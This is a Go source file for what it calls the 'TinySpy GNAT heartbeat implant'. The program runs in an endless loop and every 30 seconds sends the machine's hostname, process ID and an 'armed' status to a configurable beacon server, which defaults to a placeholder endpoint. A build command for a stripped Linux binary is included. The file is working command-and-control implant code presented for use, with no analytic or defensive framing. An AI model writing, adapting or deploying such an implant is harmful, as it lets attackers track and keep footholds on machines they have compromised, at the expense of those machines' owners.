// gnat.go — TinySpy GNAT heartbeat implant.
// Cross-compile: GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o gnat gnat.go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"
)

type report struct {
	Tool   string            `json:"tool"`
	Target string            `json:"target"`
	Data   map[string]string `json:"data"`
}

func main() {
	beacon := os.Getenv("GNAT_BEACON")
	if beacon == "" {
		beacon = "https://your-ancha-endpoint.example/beacon"
	}
	for {
		r := report{
			Tool:   "Gnat",
			Target: hostname(),
			Data:   map[string]string{"status": "armed", "pid": fmt.Sprint(os.Getpid())},
		}
		body, _ := json.Marshal(r)
		resp, err := http.Post(beacon, "application/json", bytes.NewReader(body))
		if err == nil {
			resp.Body.Close()
		}
		time.Sleep(30 * time.Second)
	}
}

func hostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}
